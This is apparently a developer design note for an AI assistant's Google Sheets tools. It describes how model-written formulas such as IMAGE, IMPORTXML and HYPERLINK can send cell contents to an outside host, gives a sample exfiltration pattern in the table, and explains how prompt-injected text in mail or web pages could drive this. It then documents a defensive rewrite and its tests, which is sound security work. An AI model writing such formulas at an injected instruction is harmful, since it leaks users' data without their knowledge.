# Sheets: formulas written by the model

`update_sheet` and `create_spreadsheet` write with `valueInputOption=USER_ENTERED`, so a string that starts with `=` becomes a live formula. A few Sheets functions reach the network from Google's servers when the sheet opens:

| Function | What it can do |
|---|---|
| `IMAGE(url)` | fetches `url`; the url can be built from other cells (`"https://x/?d="&A1:A9`), so cell content leaves the account without a click |
| `IMPORTXML`, `IMPORTDATA`, `IMPORTHTML`, `IMPORTFEED` | fetch a url and show the result in the sheet |
| `IMPORTRANGE(sheet_url, range)` | pulls another spreadsheet's cells into this one |
| `HYPERLINK(url, label)` | a link whose target can carry cell content; one click sends it |

A prompt-injected instruction in a mail, document or web page can ask the model to write such a cell, and the two Sheets writers are not approval-gated (they stay in the user's account).

## What the code does now

`api/lib/sheetSafety.js` rewrites, **in what the model writes only**, a cell that starts like a formula (`=`, `+`, `-`, `@`, after any blanks, control or zero-width characters) and contains a call to one of those functions: the cell is sent as `'` + text. Sheets reads a leading apostrophe as "this is text" and does not store it. Nothing else changes: `SUM`, `IF`, `VLOOKUP`, `ARRAYFORMULA`, `GOOGLEFINANCE` and the rest still work.

* The tool result carries `neutralized_cells`, the positions (row, column, function name, never the content) and a note telling the model to tell the user.
* The undo journal records what was really written, so redo repeats it. Undo puts back the cells that were there before, through the unchanged low-level writer, so a user's own `=IMAGE(...)` or `=IMPORTRANGE(...)` formula is restored as it was.
* `tests/sheet-formula-safety.test.mjs` also fails when a new file calls `updateSheetValues` / `createSpreadsheet`, or when the model path stops calling `neutralizeGrid`.

## Trade-offs and limits

* `HYPERLINK` is blocked as well, because its target can carry cell content. A model-written link column becomes text; a plain `https://...` string is auto-linked by Sheets anyway.
* `IMPORTRANGE` written by the model is blocked, so "pull this range from that sheet" has to be done by reading and writing values.
* A cell that merely mentions a function after a leading `-` or `=` (for example a note `- use IMPORTRANGE( ...`) is stored with the apostrophe prefix; it still shows as the same text.
* Function names in other spreadsheet locales are not covered. Sheets accepts English names in the formula API; this is **UNVERIFIED**.

## Not verified (needs a real Google account)

Run once in a throwaway spreadsheet connected to a test account:

1. Ask the assistant to write `=IMAGE("https://example.com/x.png")` into A1 of a new sheet. Expected: A1 shows the text `=IMAGE("https://example.com/x.png")`, no picture, and the tool result has `neutralized_cells: 1`.
2. Ask it to write `=SUM(1,2)` into A2. Expected: `3`.
3. In A3 type `=IMAGE("https://example.com/x.png")` yourself, ask the assistant to overwrite A3 with `x`, then undo. Expected: A3 is a live formula again.
4. After step 1, ask it to undo and redo the edit. If the undo reports the cell "has changed since that edit", Sheets returns the text with a different prefix than the journal holds; tell me and the comparison will be adjusted.
